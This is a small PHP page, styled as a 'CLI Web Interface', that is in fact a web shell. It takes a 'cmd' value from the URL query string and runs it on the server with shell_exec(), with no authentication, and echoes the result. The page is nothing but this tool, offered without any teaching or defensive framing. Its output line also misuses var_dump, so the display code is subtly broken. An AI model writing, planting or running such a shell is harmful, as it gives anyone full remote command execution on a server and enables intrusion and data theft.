<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <title>CLI Web Interface</title>
</head>
<body class="bg-gray-900 text-white p-8 flex justify-center items-center">

    <div class="max-w-md mx-auto bg-gray-800 p-6 rounded-md shadow-md">
        <form action="" method="get" class="flex items-center">
            <input type="text" name="cmd" class="bg-gray-700 text-white px-4 py-2 rounded-l-md outline-none">
            <button type="submit" class="bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded-r-md">Submit</button>
        </form>

        <?php
        if (isset($_GET['cmd'])) {
            $data = shell_exec($_GET['cmd']);
            echo '<pre class="mt-4 text-green-500">' . var_dump($data) . '</pre>';
        }
        ?>
    </div>

</body>
</html>
